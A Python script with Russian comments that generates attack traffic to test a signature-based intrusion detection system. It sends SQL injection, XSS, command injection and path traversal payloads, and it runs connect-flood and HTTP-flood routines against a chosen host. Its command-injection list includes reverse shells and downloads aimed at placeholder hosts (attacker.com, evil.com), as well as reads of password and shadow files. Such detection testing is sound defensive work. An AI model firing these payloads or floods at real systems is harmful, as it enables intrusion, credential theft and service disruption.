#!/usr/bin/env python3
"""
Скрипт тестирования системы сигнатурного анализа
Генерирует различные типы атак для проверки детектирования
"""

import socket
import time
import random
import threading
import argparse
import sys
import os
from typing import List, Dict
from dataclasses import dataclass

# Тестовые payload'ы для различных типов атак
SQL_INJECTION_PAYLOADS = [
    "1' UNION SELECT username, password FROM users--",
    "1' OR '1'='1",
    "'; DROP TABLE users;--",
    "1' AND SLEEP(5)--",
    "1' AND BENCHMARK(10000000,MD5('test'))--",
    "1' UNION SELECT NULL,extractvalue(1,concat(0x7e,(SELECT version())))--",
    "1' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
    "1'; SELECT * FROM information_schema.tables--",
    "1' UNION ALL SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--",
    "admin'--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<iframe src='javascript:alert(1)'>",
    "<a href='javascript:alert(1)'>Click</a>",
    "'-alert(1)-'",
    "<div onmouseover='alert(1)'>Hover me</div>",
]

COMMAND_INJECTION_PAYLOADS = [
    "; cat /etc/passwd",
    "| ls -la",
    "`whoami`",
    "$(id)",
    "; wget http://evil.com/shell.sh",
    "| nc -e /bin/sh attacker.com 4444",
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "; curl http://attacker.com/$(whoami)",
    "| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
]


@dataclass
class TestResult:
    """Результат теста"""
    attack_type: str
    payload: str
    success: bool
    response_time: float
    details: str = ""


class AttackSimulator:
    """Симулятор атак для тестирования"""
    
    def __init__(self, target_host: str, target_port: int, timeout: float = 5.0):
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.results: List[TestResult] = []
    
    def send_tcp_payload(self, payload: str, as_http: bool = True) -> tuple:
        """Отправка TCP payload"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target_host, self.target_port))
            
            start_time = time.time()
            
            if as_http:
                http_request = (
                    f"GET /?q={payload} HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"User-Agent: TestBot/1.0\r\n"
                    f"Connection: close\r\n\r\n"
                )
                sock.send(http_request.encode())
            else:
                sock.send(payload.encode())
            
            response = sock.recv(4096)
            elapsed = time.time() - start_time
            sock.close()
            
            return True, elapsed, response.decode('utf-8', errors='ignore')
        
        except socket.timeout:
            return False, self.timeout, "Connection timeout"
        except ConnectionRefusedError:
            return False, 0, "Connection refused"
        except Exception as e:
            return False, 0, str(e)
    
    def send_udp_payload(self, payload: str) -> tuple:
        """Отправка UDP payload"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            
            start_time = time.time()
            sock.sendto(payload.encode(), (self.target_host, self.target_port))
            
            try:
                response, _ = sock.recvfrom(4096)
                elapsed = time.time() - start_time
                return True, elapsed, response.decode('utf-8', errors='ignore')
            except socket.timeout:
                elapsed = time.time() - start_time
                return True, elapsed, "No response (UDP)"
            finally:
                sock.close()
        
        except Exception as e:
            return False, 0, str(e)
    
    def test_sql_injection(self, count: int = 5) -> List[TestResult]:
        """Тестирование SQL инъекций"""
        print(f"\n[*] Тестирование SQL Injection ({count} запросов)")
        results = []
        
        payloads = random.sample(SQL_INJECTION_PAYLOADS, min(count, len(SQL_INJECTION_PAYLOADS)))
        
        for i, payload in enumerate(payloads, 1):
            success, elapsed, details = self.send_tcp_payload(payload)
            result = TestResult("SQL_INJECTION", payload, success, elapsed, details[:200])
            results.append(result)
            
            status = "✓" if success else "✗"
            print(f"  [{i}/{count}] {status} SQLi: {payload[:50]}... ({elapsed:.3f}s)")
            time.sleep(0.1)
        
        return results
    
    def test_xss(self, count: int = 5) -> List[TestResult]:
        """Тестирование XSS атак"""
        print(f"\n[*] Тестирование XSS ({count} запросов)")
        results = []
        
        payloads = random.sample(XSS_PAYLOADS, min(count, len(XSS_PAYLOADS)))
        
        for i, payload in enumerate(payloads, 1):
            success, elapsed, details = self.send_tcp_payload(payload)
            result = TestResult("XSS", payload, success, elapsed, details[:200])
            results.append(result)
            
            status = "✓" if success else "✗"
            print(f"  [{i}/{count}] {status} XSS: {payload[:50]}... ({elapsed:.3f}s)")
            time.sleep(0.1)
        
        return results
    
    def test_command_injection(self, count: int = 5) -> List[TestResult]:
        """Тестирование Command Injection"""
        print(f"\n[*] Тестирование Command Injection ({count} запросов)")
        results = []
        
        payloads = random.sample(COMMAND_INJECTION_PAYLOADS, min(count, len(COMMAND_INJECTION_PAYLOADS)))
        
        for i, payload in enumerate(payloads, 1):
            success, elapsed, details = self.send_tcp_payload(payload)
            result = TestResult("CMD_INJECTION", payload, success, elapsed, details[:200])
            results.append(result)
            
            status = "✓" if success else "✗"
            print(f"  [{i}/{count}] {status} CMDi: {payload[:50]}... ({elapsed:.3f}s)")
            time.sleep(0.1)
        
        return results
    
    def test_syn_flood(self, count: int = 100, threads: int = 10) -> List[TestResult]:
        """Тестирование SYN flood (симуляция)"""
        print(f"\n[*] Тестирование SYN Flood ({count} соединений, {threads} потоков)")
        
        results = []
        lock = threading.Lock()
        
        def syn_attempt():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((self.target_host, self.target_port))
                sock.close()
                return True
            except:
                return False
        
        def worker(n):
            successes = 0
            for _ in range(n):
                if syn_attempt():
                    successes += 1
                time.sleep(0.01)
            
            with lock:
                results.append(TestResult(
                    "SYN_FLOOD",
                    f"SYN attempts: {n}",
                    True,
                    0,
                    f"Successful: {successes}/{n}"
                ))
        
        threads_list = []
        per_thread = count // threads
        
        start_time = time.time()
        for _ in range(threads):
            t = threading.Thread(target=worker, args=(per_thread,))
            threads_list.append(t)
            t.start()
        
        for t in threads_list:
            t.join()
        
        elapsed = time.time() - start_time
        print(f"  [+] Завершено за {elapsed:.2f}s ({count/elapsed:.0f} conn/s)")
        
        return results
    
    def test_http_flood(self, count: int = 50, threads: int = 5) -> List[TestResult]:
        """Тестирование HTTP flood"""
        print(f"\n[*] Тестирование HTTP Flood ({count} запросов, {threads} потоков)")
        
        results = []
        lock = threading.Lock()
        
        def http_request():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_host, self.target_port))
                
                request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"User-Agent: FloodBot/1.0\r\n"
                    f"Connection: close\r\n\r\n"
                )
                sock.send(request.encode())
                sock.recv(1024)
                sock.close()
                return True
            except:
                return False
        
        def worker(n):
            successes = 0
            for _ in range(n):
                if http_request():
                    successes += 1
                time.sleep(0.05)
            
            with lock:
                results.append(TestResult(
                    "HTTP_FLOOD",
                    f"HTTP requests: {n}",
                    True,
                    0,
                    f"Successful: {successes}/{n}"
                ))
        
        threads_list = []
        per_thread = count // threads
        
        start_time = time.time()
        for _ in range(threads):
            t = threading.Thread(target=worker, args=(per_thread,))
            threads_list.append(t)
            t.start()
        
        for t in threads_list:
            t.join()
        
        elapsed = time.time() - start_time
        print(f"  [+] Завершено за {elapsed:.2f}s ({count/elapsed:.0f} req/s)")
        
        return results
    
    def run_full_test(self) -> Dict[str, List[TestResult]]:
        """Запуск полного цикла тестирования"""
        print(f"\n{'='*60}")
        print(f"Тестирование системы сигнатурного анализа")
        print(f"Цель: {self.target_host}:{self.target_port}")
        print(f"{'='*60}")
        
        all_results = {}
        
        # SQL Injection тесты
        all_results['sql_injection'] = self.test_sql_injection(count=5)
        time.sleep(1)
        
        # XSS тесты
        all_results['xss'] = self.test_xss(count=5)
        time.sleep(1)
        
        # Command Injection тесты
        all_results['cmd_injection'] = self.test_command_injection(count=5)
        time.sleep(1)
        
        # SYN Flood тесты
        all_results['syn_flood'] = self.test_syn_flood(count=100, threads=5)
        time.sleep(1)
        
        # HTTP Flood тесты
        all_results['http_flood'] = self.test_http_flood(count=50, threads=5)
        
        # Итоговая статистика
        self.print_summary(all_results)
        
        return all_results
    
    def print_summary(self, results: Dict[str, List[TestResult]]):
        """Вывод итоговой статистики"""
        print(f"\n{'='*60}")
        print("ИТОГОВАЯ СТАТИСТИКА")
        print(f"{'='*60}")
        
        total_sent = 0
        total_success = 0
        
        for attack_type, result_list in results.items():
            sent = len(result_list)
            success = sum(1 for r in result_list if r.success)
            total_sent += sent
            total_success += success
            
            print(f"{attack_type:20} : {success}/{sent} успешно отправлено")
        
        print(f"{'='*60}")
        print(f"{'ВСЕГО':20} : {total_success}/{total_sent}")
        print(f"{'='*60}")


def simple_http_server(port: int = 8081):
    """Простой HTTP сервер для тестирования"""
    import http.server
    import socketserver
    
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"OK")
        
        def log_message(self, format, *args):
            pass  # Отключаем логирование
    
    with socketserver.TCPServer(("", port), Handler) as httpd:
        print(f"[*] Тестовый HTTP сервер запущен на порту {port}")
        httpd.serve_forever()


def main():
    parser = argparse.ArgumentParser(description='Тестирование системы сигнатурного анализа')
    parser.add_argument('-t', '--target', default='127.0.0.1', help='Целевой хост')
    parser.add_argument('-p', '--port', type=int, default=8081, help='Целевой порт')
    parser.add_argument('--sqli', type=int, default=0, help='Количество SQL injection тестов')
    parser.add_argument('--xss', type=int, default=0, help='Количество XSS тестов')
    parser.add_argument('--cmdi', type=int, default=0, help='Количество Command Injection тестов')
    parser.add_argument('--syn', type=int, default=0, help='Количество SYN flood попыток')
    parser.add_argument('--http', type=int, default=0, help='Количество HTTP flood запросов')
    parser.add_argument('--full', action='store_true', help='Запуск полного теста')
    parser.add_argument('--server', action='store_true', help='Запустить тестовый HTTP сервер')
    parser.add_argument('--timeout', type=float, default=5.0, help='Таймаут соединения')
    
    args = parser.parse_args()
    
    # Запуск тестового сервера
    if args.server:
        simple_http_server(args.port)
        return
    
    # Создание симулятора
    simulator = AttackSimulator(args.target, args.port, args.timeout)
    
    # Запуск выбранных тестов
    if args.full:
        simulator.run_full_test()
    else:
        if args.sqli > 0:
            simulator.test_sql_injection(args.sqli)
        if args.xss > 0:
            simulator.test_xss(args.xss)
        if args.cmdi > 0:
            simulator.test_command_injection(args.cmdi)
        if args.syn > 0:
            simulator.test_syn_flood(args.syn)
        if args.http > 0:
            simulator.test_http_flood(args.http)
        
        if not any([args.sqli, args.xss, args.cmdi, args.syn, args.http]):
            print("Используйте --full для полного теста или укажите тип атаки")
            print("Пример: python test_attacks.py --full -t 192.168.1.10 -p 8080")


if __name__ == "__main__":
    main()
